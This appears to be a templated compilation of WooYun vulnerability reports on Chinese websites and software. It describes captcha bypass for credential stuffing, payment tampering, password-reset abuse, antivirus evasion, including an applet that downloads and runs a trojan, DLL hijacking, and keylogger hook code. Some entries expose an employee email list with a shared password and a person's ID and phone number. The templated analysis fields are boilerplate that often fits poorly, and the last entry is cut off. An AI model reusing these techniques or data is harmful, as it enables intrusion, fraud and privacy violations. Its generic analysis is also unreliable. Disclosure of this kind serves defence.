### [wooyun-2013-035267] 酒美网验证码可被绕过进行注册/登陆(可扫号撞库)
**厂商**: 酒美网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1 注册网站是需要验证码的2 但我工具提交一个却可以其它的也都注册3 登陆看看是否登陆成功

**POC**: 既然注册可以绕过，登陆同样可以绕过1 登陆也是要验证码的2 工具模拟提交密码爆破，可以识别出帐号的密码3 不过wap的登陆都好像没验证码4 同样工具模拟提交可以爆破

**绕过**: 直接利用

**修复**: 过节了要送亲戚点酒，希望慷慨下，哈哈当前扫号，撞库是黑产的一个重要攻击手段，你们如果有盗号可以监控下类似登陆数据注册的话既然限制了也最好不要被绕过1 验证码不要在客户端验证，防止工具提交相同验证码2 wap没有验证码的地方加下吧
---

---
### [wooyun-2015-0160383] 拇指玩某系统逻辑缺陷泄露敏感信息
**厂商**: muzhiwan.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 如上

**绕过**: 直接利用

**修复**: 关闭外网注册接口
---

---
### [wooyun-2016-0167919] 上品折扣网设计逻辑缺陷可重置任意帐户密码
**厂商**: 上品折扣网 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 正常走一遍找回密码的流程，需要用手机接受验证码，拿到最后一步提交重置密码的url，发现竟然可以直接用在任意帐号！https://example.com/[已脱敏]

**POC**: 随便扒了个帐号，重置密码，进账户内有用户敏感信息

**绕过**: 直接利用

**修复**: 找回密码的几步要咬合起来
---

---
### [wooyun-2015-0145185] POS机安全之爱特POS某运维系统逻辑漏洞泄漏所有商户信息
**厂商**: 互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现在某互联网公司端的 爱特POS运维服务点击我的信息，发现只要输入客户号即可查看信息抓包POST /schoolweb_pos/posweixin.do?action=CheckReg&telno=&vcode=&v=1444199863057&regcode=123456&weixinid=oo0w6t-B0Nnjkeh9tY04gTxf8dbE HTTP/1.1Host: **.**.**.**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Proxy-Connection: keep-aliveAccept-Language: zh-cnAccept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedOr

**POC**: 然后对6位商户号进行遍历

**绕过**: 直接利用

**修复**: 完善逻辑
---

---
### [wooyun-2015-0105538] 某电商平台登录控件密码输入被监听漏洞
**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台安全登录控件虽然使用了消息钩子等手段进行防御，但依然不够完善，通过其他窃听手段还是能够获取到用户输入的密码。

**POC**: HHOOK g_hk = NULL;TCHAR g_buff[100] = { 0 };int g_index = 0;LRESULT CALLBACK Hook(int nCode, WPARAM wp, LPARAM lp){static DWORD a_other[] ={VK_CAPITAL, VK_LSHIFT, VK_RSHIFT, VK_LCONTROL, VK_RCONTROL, VK_LMENU, VK_RMENU,};KBDLLHOOKSTRUCT* pLL = ((KBDLLHOOKSTRUCT*)lp);DWORD vk = pLL->vkCode;for(int i 

**绕过**: 直接利用

**修复**: 建议使用强度更大的防御手段，保证自身的消息钩子优先调用，使其他应用程序没有机会获得用户输入。
---

---
### [wooyun-2014-086716] 江西智能交通某短信验证码接口任意短信伪造
**厂商**: 江西移动 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先接着WooYun: 江西智能交通漏洞可查看注册手机号实名姓名以及身份证号码下载江西交警，安装，在注册页面输入手机号后点击获取验证码(同时抓包)可以看到，验证码是0200，同时手机上（同时也知道验证码是软件随机生成，然后再GET提交给短信发送接口）http://[IP已脱敏] name is Xuwei, from https://example.com/[已脱敏]

**POC**: 还有就是只要知道某人的手机号，他又没有注册，输入他的手机号，点击获取验证码，同时抓包，就可以知道验证码，用他的手机号注册，然后点击同步，再抓包，既可得到该手机号的真实姓名身份证号码。如果他已经注册过该软件，只需要根据WooYun: 江西智能交通漏洞可查看注册手机号实名姓名以及身份证号码的方法，也同样可以获得他的身份证号码，有了真实姓名身份证号码，用处十分大，可以干好多坏事，而且短信接口这可以无限制提交，可以发送大量垃圾短信，钓鱼网站连接，危害巨大。

**绕过**: 直接利用

**修复**: 你们比我懂。
---

---
### [wooyun-2015-0122778] 49游某接口逻辑缺陷设计缺陷可进行扫号（可获取大量账号密码）
**厂商**: 49you.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x0149you手游 https://example.com/[已脱敏] “给力”GET /V7/Accounts/WebRegister?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&appId=233&password=111111&code=2837&name=a123456&device=3&_=1435240405535 HTTP/1.1Host: api.sdk.49app.comUser-Agent: Mozilla/5.0 (Macintosh

**POC**: 0x0149you手游 https://example.com/[已脱敏] “给力”GET /V7/Accounts/WebRegister?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&appId=233&password=111111&code=2837&nam

**绕过**: 直接利用

**修复**: 加验证码及登录次数限制
---

---
### [wooyun-2014-052375] 某第三方猎豹浏览器插件劫持浏览器购物信息
**厂商**: 金山网络 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-042447] 金山卫士一处栈溢出漏洞
**厂商**: 某软件厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 金山卫士一处栈溢出漏洞STATUS_STACK_BUFFER_OVERRUN encountered(1c50.1f10): Break instruction exception - code 80000003 (first chance)*** ERROR: Symbol file could not be found.  Defaulted to export symbols for D:\program files (x86)\ksafe\softmain.exe -eax=00000000 ebx=00581728 ecx=76b00174 edx=0018cb8d esi=00000000 edi=00000000eip=76afff55 esp=0018cdd4 ebp=0018ce50 iopl=0         nv up ei pl zr na pe nccs=002

**POC**: 浏览器地址栏内先输入：kingsoft://02131516然后输入：kingsoft://02131516516305616106510656021315165163056161065106560213151651630561610651065602131516516305616106510656021315165163056161065106560213151651630561610651065602131516516305616106510656021315165163056161065106560213151651630561610651065602131516516305616106

**绕过**: 直接利用

**修复**: 说的比较清楚了，你们修改吧
---

---
### [wooyun-2015-0164726] 某社交平台旗下某业务设计逻辑缺陷导致大量员工邮箱沦陷/项目通讯录泄露
**厂商**: 某社交平台 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Login url： mail.miaoche.com 下面这些大部分密码是 miaoche12345 email account：ceshi@miaoche.comcuicaixia@miaoche.comtaoye@miaoche.comcodereview@miaoche.comstat@miaoche.comzhangsusheng@miaoche.comcaoyongzhi@miaoche.comwangyuanyuan@miaoche.comchenhui@miaoche.comxuwenxi@miaoche.comliujun@miaoche.comguyun@miaoche.combianxue@miaoche.comliuxiaoman@miaoche.comhuangmeiyun@miaoche.commeizhen@miaoche.compengyan@miaoche

**POC**: Login url： mail.miaoche.com 下面这些大部分密码是 miaoche12345 email account：ceshi@miaoche.comcuicaixia@miaoche.comtaoye@miaoche.comcodereview@miaoche.comstat@miaoche.comzhangsusheng@miaoche.comcaoyongzhi@miaoche.comwangyuanyuan@miaoche.comchenhui@miaoche.comxuwenxi@miaoche.comliujun@miaoche.comguyun@miaoche.c

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0148263] 中企动力某系统设计缺陷可造成14+家商城0元支付订单
**厂商**: 中企动力科技股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 中企动力商城支付漏洞（影响14+家分站商城）千万别说跟这个漏洞重复，根本不一样上个漏洞是说在选择快递的时候，快递费可以篡改，即最多免掉快递费。现在的问题是出现在商品上，我们加入购物车的时候，抓包POST /OrderCart.do?method=addProductToMiniCartcompId=OrderCart_showMini01-1399366948166&proItemId=63&amount=1&type=1可以看到有个amount，是数量的意思，我们改成-1后提交。然后去购物车看看购物车已成功价钱变动我们直接下一步提交订单吧提交成功，付款就不测了

**POC**: 厂商很好，很给力，我会努力哒，求20Rank，谢谢

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-092307] DOUPHP后台验证码绕过(官方DEMO测试)
**厂商**: douco.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看起来有验证码，固定Cookie中的PHPSESSID不变即可进行暴力破解。admin/login.php  56-64行if (!is_array($user)) {$dou->create_admin_log($_LANG['login_action'] . ': ' . $_POST['user_name'] . " ( " . $_LANG['login_user_name_wrong'] . " ) ");$dou->dou_msg($_LANG['login_input_wrong'], 'login.php', 'out');} elseif (md5($_POST['password']) != $user['password']) {if ($_POST['password']) {$dou->create_admin_log($_LANG['login_action']

**POC**: 我们的测试字典文件100123101123102123103123104123105123106123107123108123109123110123111123admin888112123113123114123115123116123117123118123119123https://example.com/[已脱敏] 这里是自带密码admin888的，我把它添加到playload里去。正确密码返回302ResponseLocation: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 验证码使用一次，立即过期
---

---
### [wooyun-2014-060272] 某互联网公司电脑管家敏感文件防护绕过
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用一些小技巧和文件系统特性可以绕过某互联网公司电脑管家敏感文件防护。其实利用点在NTSF硬链接上，对同一个文件赋予了多个文件名和路径，而磁盘上实际只有一个文件，修改其中一个，所有文件同步变化。以host文件为例：使用命令fsutil hardlink create c:\a.txt C:\WINDOWS\system32\drivers\etc\hosts为host创建硬链接，然后ping gov.cn >> a.txt像其中追加信息。exe直接执行此命令会被拦截，提示程序试图覆盖hosts，阻止后硬链接创建失败，但是可以使用exe释放批处理文件并执行来达到目的。此时硬链接可以创建成功，但是修改会被拦截，点击拦截。按理说拦截后并没有对hosts文件造成影响，但是当实际打开时大吃一惊，拦截并未生效，hosts依旧被修改。证明中上图。

**POC**: C盘根目录截图，记录一下：原hosts文件：程序尝试直接修改被拦截：直接exe创建硬链接被拦截了，忘记截图了，下面是释放批处理文件并执行之：释放的批处理及其创建的硬链接：修改硬链接过程中提示拦截：实际拦截无效，文件被修改：

**绕过**: 过滤绕过

**修复**: 说实话，我也不知道怎么监控硬链接的修改，但是可以加强对创建的监控。
---

---
### [wooyun-2015-0152797] 中电熊猫集团某系统设计逻辑缺陷导致敏感信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**手工打码防收录。利用常用名爆破， 密码123456马上出来一个wanghao  123456ibm的邮箱，少见啊。 里面有些信息。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修修修
---

---
### [wooyun-2013-022686] 360安全卫士jre Applet挂马检测缺陷以及简单方法绕过检测
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前几天不小心看360安全卫士有对jre漏洞挂马做拦截，所以想绕过，测试了一下！//之前，有发过给你们邮箱，说附件太大没收到。发网盘后再发邮件给你们就没消息了，效率太低了，还是发乌云效率高点，看看是不是漏洞？漏洞赏金没有，看能不能刷点rank!//之前邮件描述：360安全卫士最近对jre漏洞浏览器Applet挂马攻击有做行为检测，如图：但检测存在缺陷以及直接绕过情况，简单测试步骤（详细测试视频和其他相关文件及信息在附件）：1、如果直接下载，然后就运行木马就是上图的情况，被拦截：this.downLoad("http://[IP已脱敏] "C:/Program Files/360.exe");//下载木马this.runFile("C:/Program Files/360.exe");//运行2、在第1步中，是下载木马到本地，然后运行会被拦截，检测规则是两部分

**POC**: //今天又做了另一个jre漏洞（CVE-2012-4681）同样方式测试，弄了个综合测试地址：https://example.com/[已脱敏] Files/目录//    this.downLoad("https://example.com/[已脱敏]", "C:/Program Files/360.exe");//下载木马//    this.runFile("C:/Program Files/360.exe");//运行//下载到java安装目录(jre运行目录)，运行木马，这一目录行为绕过拦截// this.

**绕过**: 过滤绕过

**修复**: 这应该是漏洞吧？
---

---
### [wooyun-2014-052870] c-Free 5.0 对话框编辑器 缓冲区溢出漏洞
**厂商**: c-Free | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: poc：把下面数据以16进制的形式保存在文件中（大小为740H) 偏移656H处（我这里写的是CCCCCCCC）就是我们要修改的EIP地址0000000020000000FFFF0000FFFF0000000000000000000000000000000000000007000020000000FFFF0500FFFF640000000000301000000000000000000000C000C890000000000000060012001C01B00000000000610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610061006100610

**POC**: 文件偏移656H处为要修改的EIP，这里我们用cccccccc实验第一步 打开我们构造的文件，打开后稍微移动一下对话框第二步 选择EDIT-STYLES（或者Ctrl+Y)  然后取消。然后就触发了我们发现EIP已经是我们要设置的CCCCCCCC了

**绕过**: 直接利用

**修复**: 检测大小
---

---
### [wooyun-2013-042949] adnroid游戏均存在的短信扣费/话费支付绕过漏洞。
**厂商**: 格融移动科技（北京）有限公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试了好几adnroid平台下的游戏，都存在此漏洞。/在adnroid平台下的游戏中购买增值服务（金币、装备），都会有一个短信购买或是话费支付神马的字样。正常情况下点击后手机就会发送一条短信确认购买。然后你的话费就少鸟，当然你获得了相应的虚拟东东。我们都知道在手机短信设置里面有一个设置短信中心号码的选项。只要把短信中心号码修改成一个错误的短信中心号码，就可导致发不出去任何一条短信。这时候在进入游戏选择话费支付会导致那些扣费短信都发送不出去，但游戏界面中仍然会提示购买成功。以下是测试的  武士大战僵尸 游戏截图。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我也不知道！ 囧
---

---
### [wooyun-2013-039716] 某手机厂商某合作游戏BUG导致可秒杀高等级玩家
**厂商**: 某手机厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某手机厂商公司与莱茵天下（北京）有限公司合作的游戏某手机厂商部落存在设计错误。漏洞1.日常任务可以通过修改本地内存的数据，以达到不用作任务，就可以领取日常任务中的奖历。任务未完成前，不可以领取奖历，通过内存数据修改，将要达到的值如100，120，...200，这些数据改成0，或比自己小的数据，然后就可以直接领取了。领取后如图===================================漏洞2.秒对手。同样的道理，可以通过修改本地内存的方式，使游戏本身人员的攻击，血里增加，这里改成999999，比对方高好几十倍，以达到秒杀比自己高几十级的玩家，并可以轻松的解救对方的奴隶。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你比我专业
---

---
### [wooyun-2014-048360] 某社交平台微彩票应用逻辑漏洞
**厂商**: 某社交平台 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 微彩票1分钱买彩票.在web端购买,不付款,然后安卓手机某社交平台客户端购买,付款后,再去web端付款,可以重复购买,相当于花2分钱买了2注彩票...ps:客户端上购买时貌似会提示只能购买一注,但当时俺点了后貌似跳过这个弹框进入支付了..求多送几注彩票呗.. 哈哈..

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强逻辑判断.
---

---
### [wooyun-2015-0137462] 某知名食品商城某重要功能存在逻辑缺陷
**厂商**: www.laiyifen.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我是看到新闻你们网站被刷了6万  我就顺手测了一下你们官网https://example.com/[已脱敏] 来伊份支付漏洞才得逞的这个漏洞只提到你们的app有问题  没提到你们官网  所以我就提个醒  如果你们已经知道就请忽略吧付款抓包篡改某电商平台

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我专业
---

---
### [wooyun-2015-0150866] 中国知网某功能设计逻辑缺陷可获取大量账号信息
**厂商**: 中国知网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：中国知网 (注：提交漏洞时选其它厂商总出错，提示“找不到该厂商”，无奈只好随便选了一个）漏洞地址：http://**.**.**.**/login.aspx漏洞描述：在未登录状态下，直接访问http://**.**.**.**/login.aspx，会出现登录界面，这里虽然看似有图片验证码，但实际上采用的是cookier验证访问，可轻松绕过从而实施各种弱口令的账户暴破，其中还包括有账户余额的账号。截获登录请求如下：POST /login.aspx HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,

**POC**: 以下为暴破到的密码为123456的账号：albanyambleapexappleaquilineartisticasassignaveravertbakerybastardblestbridgebutcherbycaaccairocantatachargerchariotchipschosencircuitcleanercombocomingcompletecompoundcontentscropcrosscupczardeprivedesiredevildropbyductileenclaveensignepicureequaleternalevadeexcitefighterfloorfl

**绕过**: 过滤绕过

**修复**: 1、采用服务端验证码机制；2、限制登录失败次数，超过次数限制登录一段时间。
---

---
### [wooyun-2014-082287] 遨游浏览器下载功能未限制同源可造成RFD攻击（一定条件下执行命令）
**厂商**: 傲游 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考https://example.com/[已脱敏] href="https://example.com/[已脱敏]" download="123.bat">UPDATE</a></br></body></html>

**POC**: 弹出计算机

**绕过**: 直接利用

**修复**: .
---

---
### [wooyun-2015-094635] 某视频网站Android 4.5客户端升级漏洞
**厂商**: 某视频网站 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 组件com.youku.service.push.StartActivityService声明如下：<serviceandroid:label="Youku Push Notifications StartActivityService"android:name="com.youku.service.push.StartActivityService"android:exported="true">可知该组件对外暴露。该组件对应的代码执行部分如下：protected void onHandleIntent(Intent intent) {Intent v0;String v23;Serializable pushMsg = intent.getSerializableExtra("PushMsg");......AppVersionManager.getInstance(Youku.con

**POC**: 该漏洞触发的关键在于对PushMsg数据的控制，基本思路如下：1.创建一个Android App程序，在主Activity中的关键代码如下：PushMsg pushMsg = new PushMsg();pushMsg.type = 1;pushMsg.updateurl = "https://example.com/[已脱敏]";pushMsg.updatecontent = "This is Fake";Intent intent = new Intent();intent.setClass

**绕过**: 直接利用

**修复**: 组件不暴露、对升级地址进行判断、对下载的APK文件进行校验！
---

---
### [wooyun-2013-023140] 万达电影主站用户信息泄露高危风险
**厂商**: 大连万达集团股份有限公司 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 万达电影网站在处理会员卡充值时，未校验会员卡身份，直接回显会员持有人身份证、手机号等敏感信息。https://example.com/[已脱敏]	8002012036437会员卡级别：	广州IMAX卡会员卡金额：	170身份证号：	220421198911150810联系电话：	18613153337注册时间：	2012-12-09到期时间：	2013-12-09通过获取如下的信息，可致电客服热线：400-080-6060，重置任意会员卡的密码，进而消费。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不需要输出的信息还是尽量不要输出。
---

---
### [wooyun-2014-058962] 同样的方式再绕过金山新毒霸（悟空）
**厂商**: 金山毒霸 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 以前给公司卖命的时候有N多漏洞不能公布分享，现在俺就一个人，也想来乌云添砖加瓦！启发式查杀和主动防御在不同的两个逻辑层面进行系统防护，但都依靠对恶意软件的恶意行为来进行查杀，如果恶意行为被分散在不同的逻辑层面上，将会令这两大防御功能同时失效。拿下载者为例，下载者的恶意特征就是“下载+执行”，大多数启发式杀毒只要看到山寨软件有这个行为就会报毒了，但如果我们把“下载+执行”分成两个文件会怎么样？DownFile.exe负责下载，ExecFile.exe负责把下载下来的东西跑起来，单独看两个文件都是没有恶意行为的，但它们配合到一起，嘿嘿。。。。。你懂的，两个文件配合的方式很多，利用bat、vbs、压缩包、系统回调等等想怎么玩都行。下面是实验过程细节：两个简单的测试程序代码：// DownFile.cpp : 负责下载一个exe程序，这里我用winrar的安装包替代，//文件很大演示的时候能看清步

**POC**: 整个过程已经录像存证。版本号为测试当天的最新版本，红色圆圈为生成好的下载者压缩包。运行压缩包下载者后，测试用的rar安装包被自动下载并且成功执行，整个过程新毒霸没有任何提示。

**绕过**: 直接利用

**修复**: 先把特征码加进去吧，然后建立多个文件之间关联分析模型，切断配合路径。
---

---
### [wooyun-2013-028577] 金山毒霸可信任路径漏洞
**厂商**: 金山毒霸 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在可信任路径漏洞

**POC**: 新毒霸的手机助手存在可信任路径漏洞，在c盘放置Program.exe后，每次开启手机助手都会优先执行该Program.exe ,恶意软件可以通过这种方式每次加载启动。如图，在c盘根目录放一个Program.exe 的cmd程序，打开手机助手程序后后 即会执行该CMD

**绕过**: 直接利用

**修复**: 毒霸起“手机助手”进程时加双引号
---

---
### [wooyun-2013-037407] 暴风影音一处开机自启的DLL劫持
**厂商**: 暴风影音 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 暴风影音最新版本DLL新型劫持漏洞之前这贴暴风主程序StormPlayer.exe劫持运行不存在的ieframe.dll说不算劫持，唯有再发一贴。这次是BaofengPlatform.exe劫持运行不存在的DLL 版本描述是：暴风影音平台中心而且暴风影音安装后，BaofengPlatform.exe会强制添加到注册表里自动开机启动。测试时暴风的默认安装路径C:\Program Files\Baofeng\StormPlayer\BaofengPlatform.exe运行时会加载一个不存在的DLL文件crashreporter.dllcrashreporter.dll路径为C:\Program Files\Baofeng\StormPlayer\stormnc\只要自己写一个crashreporter.dll放在指定路径，这样就可以在BaofengPlatform.exe自启

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2015-0127684] 美乐乐官网支付漏洞任意元购买（附1分钱买3万豪门家具案列）
**厂商**: meilele.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先来首页注册帐号看家具去了   呆了 好贵3万加入购物车结算提交订单都没没什么发现直到最后付款哈哈  机智的我  抓包下面是银行卡付款案列，改的小数点（2.77）这里是0.1元某电商平台付款付款不用说 百分百成功兜里有钱 咱不差一分钱

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 波及波及波及
---

---
### [wooyun-2015-0160699] 某家电厂商某网站设计逻辑缺陷导致信息泄露
**厂商**: 某家电厂商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: url:email.gee.com.cn首先输入一个不存在的邮箱，提示然后利用该特性来收集用户，利用人名top100爆破，找到这么几个用户。然后爆破密码ok，进去了，大量用户的邮箱，收集起来任意爆破，不爆了，再爆该查水表了邮箱都去掉了。

**POC**: 某家电厂商全球500强，对网络安全这么不看重？

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-095639] 傲游游戏某接口设计不当可绕过验证码暴力破解用户可撞库#2（洗号神马的你懂得）
**厂商**: 傲游 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 缺个移动硬盘存片子
---

---
### [wooyun-2013-036867] 百万亚瑟王加密方式泄漏
**厂商**: 盛大游戏 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

